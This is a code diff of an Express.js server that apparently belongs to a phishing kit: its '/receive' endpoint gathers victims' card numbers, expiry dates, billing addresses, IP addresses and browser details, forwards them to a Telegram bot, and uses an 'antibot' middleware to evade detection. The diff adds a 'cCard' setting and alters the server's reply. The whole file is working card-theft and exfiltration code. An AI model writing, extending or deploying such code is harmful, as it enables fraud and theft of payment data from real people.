@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const { botToken, chatId } = require('./Config/settings.js');
+const { botToken, chatId, cCard } = require('./Config/settings.js');
 const antibot = require('./middleware/antibot');
 const { sendMessageFor } = require('simple-telegram-message');
 const { getClientIp } = require("request-ip");
@@ -95,6 +95,9 @@ app.post('/receive', async (req, res) => {
         `USER AGENT       : ${userAgent}\n` +
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+res.send('cCard');
+
   }
 
   if (myObjects.includes('Expiry date') || myObjects.includes('Card Number') || myObjects.includes('Billing Address')) {
@@ -118,7 +121,7 @@ app.post('/receive', async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId); 
   sendMessage(message);
   
-  res.send('Data received and processed.');
+  
 });
 
 
